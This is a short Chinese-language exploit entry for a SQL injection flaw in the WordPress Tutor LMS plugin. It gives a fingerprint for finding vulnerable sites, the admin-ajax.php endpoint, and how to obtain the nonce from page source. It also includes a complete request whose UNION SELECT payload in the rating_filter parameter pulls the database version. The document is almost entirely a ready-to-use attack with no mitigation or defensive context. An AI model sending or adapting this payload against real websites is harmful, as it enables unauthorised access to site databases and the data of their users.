# WordpressTutorLMS插件插件存在SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body="/wp-content/plugins/tutor/"`
- **请求**：`POST /wp-admin/admin-ajax.php HTTP/1.1`

**Payload**
```
查看源码，查看tutor_nonce
Host:
Content-Type: application/x-www-form-urlencoded
action=load_filtered_instructor&_tutor_nonce=573ec53d39&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,concat(0x7e,version(),0x7e),11,12,14--+-
```
- **响应特征**：200 响应时间>=5s